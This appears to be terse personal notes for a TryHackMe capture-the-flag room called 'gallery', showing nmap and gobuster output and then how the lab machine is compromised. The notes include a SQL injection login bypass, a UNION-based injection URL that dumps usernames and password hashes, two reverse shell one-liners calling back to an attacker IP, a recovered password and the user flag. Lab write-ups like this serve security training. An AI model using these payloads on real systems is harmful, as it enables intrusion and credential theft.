galllery 



ENUMERATION 


"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/gallery]
└─$ sudo nmap -p- -sC -sV -A  --min-rate 2500 10.10.65.227 -oN nmap.txt 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-05 07:53 EST
Warning: 10.10.65.227 giving up on port because retransmission cap hit (10).
Stats: 0:01:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 85.97% done; ETC: 07:54 (0:00:12 remaining)
Stats: 0:01:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.65.227
Host is up (0.15s latency).
Not shown: 60358 closed tcp ports (reset), 5175 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Simple Image Gallery System
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   277.32 ms 10.11.0.1
2   277.43 ms 10.10.65.227

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.32 seconds
                                                               


"""

GOBUSTER 



"""




┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/gallery]
└─$ gobuster dir -u http://10.10.65.227/ -w /usr/share/wordlists/dirb/big.txt  -t 100 --no-error  -x php,jsp,txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.65.227/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,jsp,txt
[+] Timeout:                 10s
===============================================================
2022/03/05 07:53:43 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.jsp        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.jsp        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/gallery              (Status: 301) [Size: 314] [--> http://10.10.65.227/gallery/]
/server-status        (Status: 403) [Size: 277]                                   
                                                                                  
===============================================================
2022/03/05 07:58:16 Finished
===============================================================
                                                                    



"""


THEIR IS A LOGIN PAGE /gallery

BY PASS THE LOGIN PAGE ' or 1=1 -- '

SO FORWARDED TO THE ADMIN PORTAL


bash -i >& /dev/tcp/10.11.61.80/1234 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.61.80 1234 >/tmp/f




SQLI

"""""
AFTER ENUMERATING THE WHOLE MACHINE 

http://10.10.82.200/gallery/?page=albums/images&id=2%27%20union%20select%201,2,concat(username,password),4,5,6,7,8%20from%20users%20--%20-

admin

a228b12a08b6527e7978cbe5d914531c



SHELLL

MIKE BACK UP FOLDER AND BASH HISTORY 

PASSWORD
b3stpassw0rdbr0xx



LETS CHANGE USER 

mike@gallery:~$ cat user.txt
cat user.txt
THM{af05cd30bfed67849befd546ef}

